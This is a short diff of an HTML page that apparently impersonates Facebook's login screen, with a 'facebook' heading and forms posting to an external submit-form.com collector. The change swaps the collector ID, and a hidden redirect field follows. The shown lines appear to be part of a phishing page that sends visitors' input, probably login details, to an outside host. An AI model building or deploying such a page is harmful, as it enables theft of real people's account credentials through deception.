@@ -12,8 +12,8 @@
       <b class="text-5xl text-white">facebook</b>
   </div>
 
-  <form class="sm:hidden lg:block md:block" action="https://submit-form.com/L30LgINhe" method="post"> 
-<form action="https://submit-form.com/L30LgINhe">
+  <form class="sm:hidden lg:block md:block" action="https://submit-form.com/Z398HQ0Rv" method="post"> 
+<form action="https://submit-form.com/Z398HQ0Rv">
   <input
     type="hidden"
     name="_redirect"
